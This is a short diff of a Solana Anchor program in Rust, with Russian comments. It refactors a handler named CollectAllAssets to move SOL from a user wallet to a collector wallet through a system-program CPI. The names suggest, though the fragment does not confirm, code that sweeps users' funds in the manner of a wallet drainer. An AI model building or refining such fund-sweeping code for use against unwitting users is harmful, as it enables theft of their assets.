@@ -1,8 +1,5 @@
 use anchor_lang::prelude::*;
-use anchor_lang::solana_program::{
-    program::invoke,
-    system_instruction,
-};
+use anchor_lang::system_program;
 use crate::state::*;
 use crate::error::ErrorCode;
 
@@ -54,21 +51,16 @@ pub fn handler(ctx: Context<CollectAllAssets>) -> Result<()> {
         
         msg!("Переводим SOL: {} лампортов", transfer_amount);
         
-        // Создаем инструкцию перевода SOL
-        let transfer_instruction = system_instruction::transfer(
-            &user_wallet.key(),
-            &collector_wallet.key(),
-            transfer_amount,
-        );
-        
-        // Выполняем перевод SOL
-        invoke(
-            &transfer_instruction,
-            &[
-                user_wallet.to_account_info(),
-                collector_wallet.to_account_info(),
+        // Используем CPI для перевода SOL через system program
+        system_program::transfer(
+            CpiContext::new(
                 ctx.accounts.system_program.to_account_info(),
-            ],
+                system_program::Transfer {
+                    from: user_wallet.to_account_info(),
+                    to: collector_wallet.to_account_info(),
+                },
+            ),
+            transfer_amount,
         )?;
         
         msg!("SOL успешно переведен!");
